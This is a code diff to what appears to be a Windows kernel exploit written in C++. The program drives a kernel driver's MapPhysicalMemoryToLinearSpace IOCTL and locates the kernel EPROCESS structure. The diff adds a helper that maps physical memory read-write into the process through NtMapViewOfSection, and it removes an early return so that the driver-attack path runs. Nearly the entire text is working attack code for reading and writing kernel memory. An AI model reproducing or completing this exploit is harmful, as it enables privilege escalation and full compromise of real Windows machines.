@@ -52,6 +52,36 @@ typedef struct _RTL_PROCESS_MODULES
 //source: https://processhacker.sourceforge.io/doc/ntldr_8h_source.html
 
 
+#define PHYSICAL_ADDRESS	LARGE_INTEGER
+using myNtMapViewOfSection = NTSTATUS(NTAPI*)(HANDLE SectionHandle, HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits, SIZE_T CommitSize, PLARGE_INTEGER SectionOffset, PSIZE_T ViewSize, DWORD64 InheritDisposition, ULONG AllocationType, ULONG Win32Protect);
+myNtMapViewOfSection fNtMapViewOfSection = (myNtMapViewOfSection)(GetProcAddress(GetModuleHandleA("ntdll"), "NtMapViewOfSection"));
+static BOOLEAN MapPhysicalMemory(HANDLE PhysicalMemory, PDWORD64 Address, PSIZE_T Length, PDWORD64 VirtualAddress)
+{
+	NTSTATUS			ntStatus;
+	PHYSICAL_ADDRESS	viewBase;
+
+	*VirtualAddress = 0;
+	viewBase.QuadPart = (ULONGLONG)(*Address);
+	ntStatus = fNtMapViewOfSection
+	(
+		PhysicalMemory,
+		GetCurrentProcess(),
+		(PVOID*)VirtualAddress,
+		0L,
+		*Length,
+		&viewBase,
+		Length,
+		2,
+		0,
+		PAGE_READWRITE
+	);
+
+	if (!NT_SUCCESS(ntStatus)) return false;
+	*Address = viewBase.LowPart;
+	return true;
+}
+
+
 LPVOID EPROCESS_address(LPVOID ntoskernlBase) {
 	HMODULE hNtoskrl = LoadLibrary(L"ntoskrnl.exe");
 	if (hNtoskrl == NULL) {
@@ -128,9 +158,7 @@ NTSTATUS UnmapPhysicalMemory(Phys32Struct& phys32) {
 
 int main(char argc, char** argv)
 {
-	printf("\n\n\nEPROCESS_adress: %p", EPROCESS_address(ntoskernl_base()));
-
-	return 0;
+	printf("\n\n\nEPROCESS_adress: %p\n", EPROCESS_address(ntoskernl_base()));
 	HANDLE device = INVALID_HANDLE_VALUE;
 	NTSTATUS status = FALSE;
 	DWORD bytesReturned = 0;
@@ -151,6 +179,7 @@ int main(char argc, char** argv)
 		fprintf(stderr, "[!] IOCTL_MapPhysicalMemoryToLinearSpace failed with %X\n", status);
 		return EXIT_FAILURE;
 	}
+
 	printf("[*] IOCTL_MapPhysicalMemoryToLinearSpace 0x%X called successfully\n", IOCTL_MapPhysicalMemoryToLinearSpace);
 	printf("[*] Buffer from the kernel land:\n");
 	printf("phys32Struct.dwPhysMemSizeInBytes: %lld\n", phys32Struct.dwPhysMemSizeInBytes);
